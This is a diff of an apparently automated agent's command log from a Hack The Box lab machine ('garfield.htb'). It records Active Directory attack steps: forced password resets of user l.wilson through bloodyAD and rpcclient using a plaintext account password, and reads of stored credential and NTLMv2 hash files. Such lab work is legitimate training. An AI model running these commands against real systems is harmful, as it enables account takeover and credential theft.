@@ -173,3 +173,17 @@ pip3 list 2>/dev/null | grep -i -E "adws|wcf|soap" ; bloodyAD --help 2>&1 | grep
 [10:27:14] RUN: which xfreerdp xfreerdp3 rdesktop 2>/dev/null; apt list --installed 2>/dev/null | grep -i rdp
 [10:27:16] RUN: timeout 10 bash -c '(echo -ne "\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"; sleep 3) | cat - <(sleep 3) | openssl s_client -connect 10.129.17.178:2179 -quiet 2>&1' | xxd | head -20
 [10:27:23] RUN: apt-get install -y xfreerdp3 2>&1 | tail -5
+[10:27:27] RUN: sudo apt-get install -y freerdp2-x11 2>&1 | tail -5
+[10:28:31] RUN: bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set password l.wilson 'NewP@ss123!' 2>&1
+[10:28:36] RUN: rpcclient -U 'j.arbuckle%Th1sD4mnC4t!@1978' 10.129.17.178 -c 'setuserinfo2 l.wilson 23 NewP@ss123!' 2>&1
+[10:28:39] RUN: pip install bloodyAD -q 2>&1 | tail -3
+[10:28:42] RUN: pip install bloodyAD -q --break-system-packages 2>&1 | tail -3
+[10:28:46] RUN: bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set password l.wilson 'NewP@ss123!' 2>&1
+[10:28:49] RUN: python3 -m bloodyAD -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.17.178 set password l.wilson 'NewP@ss123!' 2>&1
+[10:29:30] READ: /htb/state/creds.jsonl
+[10:29:31] READ: /htb/machines/garfield/state/creds.jsonl
+[10:29:42] GREP: l\.wilson|NTLMv2|ntlmv2|5600
+[10:29:42] GREP: l\.wilson|NTLMv2|ntlmv2
+[10:29:45] READ: /htb/machines/garfield/exploits/lwilson_hash.txt
+[10:29:51] READ: /htb/machines/garfield/exploits/gen_liz_wordlist.py
+[10:29:52] RUN: ls /htb/machines/garfield/exploits/
